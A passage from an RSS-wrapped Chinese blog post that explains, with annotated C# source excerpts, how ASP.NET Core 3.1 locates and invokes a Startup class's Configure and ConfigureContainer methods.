    //通过startup类型和方法名为Configure或Configure+环境变量名称的方法
    var configureMethod = FindMethod(startupType, &quot;Configure{0}&quot;, environmentName, typeof(void), required: true);
    //用查找到的方法去初始化ConfigureBuilder
    return new ConfigureBuilder(configureMethod);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从这里我们可以看到FindConfigureDelegate方法也是调用的FindMethod方法，只是传递的方法名字符串为Configure或Configure+环境变量，关于FindMethod的方法实现我们在上面讲解ConfigureServices方法的时候已经非常详细的说过了，这里就不过多的讲解了。总之是通过FindMethod去查找名为Configure的方法或名为Configure+环境变量的方法比如ConfigureDevelopment查找规则和ConfigureServices是完全一致的。但是Configure方法却可以通过参数注入注册到IServiceCollection中的服务，答案我们同样要在ConfigureBuilder类中去探寻&lt;br/&gt;[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/Internal/ConfigureBuilder.cs&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;internal class ConfigureBuilder
{
    //构造函数传递Configure的MethodInfo
    public ConfigureBuilder(MethodInfo configure)
    {
        MethodInfo = configure;
    }

    public MethodInfo MethodInfo { get; }
    //Build方法返回Action&amp;lt;IApplicationBuilder&amp;gt;委托
    public Action&amp;lt;IApplicationBuilder&amp;gt; Build(object instance) =&amp;gt; builder =&amp;gt; Invoke(instance, builder);
    //执行逻辑
    private void Invoke(object instance, IApplicationBuilder builder)
    {
        //通过IApplicationBuilder的ApplicationServices获取IServiceProvider实例创建一个作用域
        using (var scope = builder.ApplicationServices.CreateScope())
        {
            //获取IServiceProvider实例
            var serviceProvider = scope.ServiceProvider;
            //获取Configure的所有参数
            var parameterInfos = MethodInfo.GetParameters();
            var parameters = new object[parameterInfos.Length];
            for (var index = 0; index &amp;lt; parameterInfos.Length; index++)
            {
                var parameterInfo = parameterInfos[index];
                //如果方法参数为IApplicationBuilder类型则直接将传递过来的IApplicationBuilder赋值给它
                if (parameterInfo.ParameterType == typeof(IApplicationBuilder))
                {
                    parameters[index] = builder;
                }
                else
                {
                    try
                    {
                        //根据方法的参数类型在serviceProvider中获取具体实例赋值给对应参数
                        parameters[index] = serviceProvider.GetRequiredService(parameterInfo.ParameterType);
                    }
                    catch (Exception ex)
                    {
                        //如果对应的方法参数名称，没在serviceProvider中获取到则直接抛出异常
                        //变相的说明了Configure方法的参数必须是注册在IServiceCollection中的
                    }
                }
            }
            MethodInfo.InvokeWithoutWrappingExceptions(instance, parameters);
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过ConfigureBuilder类的实现逻辑，可以清晰的看到为何Configure方法参数可以注入任何在IServiceCollection中注册的服务了。接下来我们总结一下Configure方法的初始化逻辑，&lt;span&gt;首先在Startup中查找方法名为Configure或Configure+环境变量名称(比如ConfigureDevelopment)的方法，然后查找IApplicationBuilder类型的参数，如果找到则将程序中的IApplicationBuilder实例传递给它。至于为何Configure方法能够通过参数注入任何在IServiceCollection中注册的服务，则是因为循环Configure中的所有参数然后在IOC容器中获取对应实例赋值过来，Configure方法的参数一定得是在IServiceCollection注册过的类型，否则会抛出异常。&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;configurecontainer为何会被调用&quot;&gt;ConfigureContainer为何会被调用&lt;/h4&gt;
&lt;p&gt;如果你在ASP.NET Core 3.1中使用过Autofac那么你对ConfigureContainer方法一定不陌生，它和ConfigureServices、Configure方法一样的神奇，在几乎没有任何约束的情况下我们只需要定义ConfigureContainer方法并为方法传递一个ContainerBuilder参数，那么这个方法就能顺利的被调用了。这一切究竟是如何实现的呢，接下来我们继续探究源码，找到了如下的逻辑&lt;br/&gt;[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/GenericHost/GenericWebHostBuilder.cs#L246&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;//根据规则查找最终返回ConfigureContainerBuilder实例
var configureContainerBuilder = StartupLoader.FindConfigureContainerDelegate(startupType, context.HostingEnvironment.EnvironmentName);
if (configureContainerBuilder.MethodInfo != null)
{
    //获取容器类型比如如果是autofac则类型为ContainerBuilder
    var containerType = configureContainerBuilder.GetContainerType();
    // 存储configureContainerBuilder实例
    _builder.Properties[typeof(ConfigureContainerBuilder)] = configureContainerBuilder;
    //构建一个Action&amp;lt;HostBuilderContext,containerType&amp;gt;类型的委托
    var actionType = typeof(Action&amp;lt;,&amp;gt;).MakeGenericType(typeof(HostBuilderContext), containerType);

    // 获取此类型的私有ConfigureContainer方法，然后声明该方法的泛型为容器类型，然后创建这个方法的委托
    var configureCallback = GetType().GetMethod(nameof(ConfigureContainer), BindingFlags.NonPublic | BindingFlags.Instance)
                                     .MakeGenericMethod(containerType)
                                     .CreateDelegate(actionType, this);

    // 等同于执行_builder.ConfigureContainer&amp;lt;T&amp;gt;(ConfigureContainer)，其中T为容器类型。
    //C onfigureContainer表示一个委托,即我们在Startup中定义的ConfigureContainer委托
    typeof(IHostBuilder).GetMethods().First(m =&amp;gt; m.Name == nameof(IHostBuilder.ConfigureContainer))
        .MakeGenericMethod(containerType)
        .InvokeWithoutWrappingExceptions(_builder, new object[] { configureCallback });
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;继续使用老配方，我们查看StartupLoader的FindConfigureContainerDelegate方法实现&lt;br/&gt;[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/Internal/StartupLoader.cs#L282&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;internal static ConfigureContainerBuilder FindConfigureContainerDelegate(Type startupType, string environmentName)
{
    //根据startupType和根据environmentName构建的Configure{0}Services字符串先去查找返回类型为IServiceProvider的方法
    var configureMethod = FindMethod(startupType, &quot;Configure{0}Container&quot;, environmentName, typeof(void), required: false);
    //用查找到的方法去初始化ConfigureContainerBuilder
    return new ConfigureContainerBuilder(configureMethod);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;果然还是这个配方这个味道，废话不多说直接查看ConfigureContainerBuilder源码&lt;br/&gt;[&lt;a href=&quot;https://github.com/dotnet/aspnetcore/blob/v3.1.9/src/Hosting/Hosting/src/Internal/ConfigureContainerBuilder.cs&quot;&gt;点击查看源码👈&lt;/a&gt;]&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;internal class ConfigureContainerBuilder
{
    public ConfigureContainerBuilder(MethodInfo configureContainerMethod)
    {
        MethodInfo = configureContainerMethod;
    }
    public MethodInfo MethodInfo { get; }
    public Func&amp;lt;Action&amp;lt;object&amp;gt;, Action&amp;lt;object&amp;gt;&amp;gt; ConfigureContainerFilters { get; set; } = f =&amp;gt; f;
    public Action&amp;lt;object&amp;gt; Build(object instance) =&amp;gt; container =&amp;gt; Invoke(instance, container);
    //查找容器类型，其实就是ConfigureContainer方法的的唯一参数
    public Type GetContainerType()
    {
        var parameters = MethodInfo.GetParameters();
        //ConfigureContainer方法只能包含一个参数
        if (parameters.Length != 1)
        {
            throw new InvalidOperationException($&quot;The {MethodInfo.Name} method must take only one parameter.&quot;);
        }
        return parameters[0].ParameterType;
    }

    private void Invoke(object instance, object container)
    {
        ConfigureContainerFilters(StartupConfigureContainer)(container);
        void StartupConfigureContainer(object containerBuilder) =&amp;gt; InvokeCore(instance, containerBuilder);
    }
    
    //根据传递的container对象执行ConfigureContainer方法逻辑比如使用autofac时ConfigureContainer(ContainerBuilder)
    private void InvokeCore(object instance, object container)
    {
        if (MethodInfo == null)
        {
            return;
        }
        var arguments = new object[1] { container };
        MethodInfo.InvokeWithoutWrappingExceptions(instance, arguments);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;果不其然千年老方下来还是那个味道，和ConfigureServices、Configure方法思路几乎一致。这里需要注意的是GetContainerType获取的容器类型是ConfigureContainer方法的唯一参数即容器类型，如果传递多个参数则直接抛出异常。其实Startup的ConfigureContainer方法经过花里胡哨的一番操作之后，最终还是转换成了雷士如下的操作方式,这个我们在上面代码中构建actionType的时候就可以看出，最终通过查找到的容器类型去完成注册等相关操作，这里就不过多的讲解了&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cs&quot;&gt;Host.CreateDefaultBuilder(args)
        .ConfigureContainer&amp;lt;ContainerBuilder&amp;gt;((context,container)=&amp;gt; {
            container.RegisterType&amp;lt;PersonService&amp;gt;().As&amp;lt;IPersonService&amp;gt;().InstancePerLifetimeScope();
        });
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;总结&quot;&gt;总结&lt;/h4&gt;
&lt;p&gt;    本篇文章我们主要是围绕着Startup是如何被初始化进行讲解的，分别讲解了Startup是如何被实例化的，为何Startup的构造函数只能传递IWebHostEnvironment、IHostEnvironment、IConfiguration类型的参数，以及ConfigureServices、Configure、ConfigureContainer方法是如何查找到并被初始化调用的。其中虽然涉及到的代码比较多，但是整体思路在阅读源码后还是比较清晰的。由于笔者文笔有限，可能许多地方描述的不够清晰，亦或是本人能力有限理解的不够透彻，不过本人在文章中都标记了源码所在位置的链接，如果有感兴趣的同学可以自行点击连接查看源码。Startup类比较常用，如果能够更深层次的了解其原理，对我们实际编程过程中会有很大的帮助，同时呼吁更多的小伙伴们深入阅读了解.NET Core的源码并分享出来。如有各位有疑问或者有了解的更透彻的，欢迎评论区提问或批评指导。&lt;/p&gt;
&lt;div align=&quot;center&quot;&gt;&lt;span&gt;👇欢迎扫码关注我的公众号👇&lt;/span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/2042116/202006/2042116-20200622133425514-1420050576.png&quot;/&gt;&lt;/div&gt;
</description>
<pubDate>Mon, 02 Nov 2020 16:29:00 +0000</pubDate>
<dc:creator>yi念之间</dc:creator>
<og:description>前言 Startup类相信大家都比较熟悉,在我们使用ASP.NET Core开发过程中经常用到的类，我们通常使用它进行IOC服务注册，配置中间件信息等。虽然它不是必须的，但是将这些操作统一在Start</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/wucy/p/13886728.html</dc:identifier>
</item>
</channel>
</rss>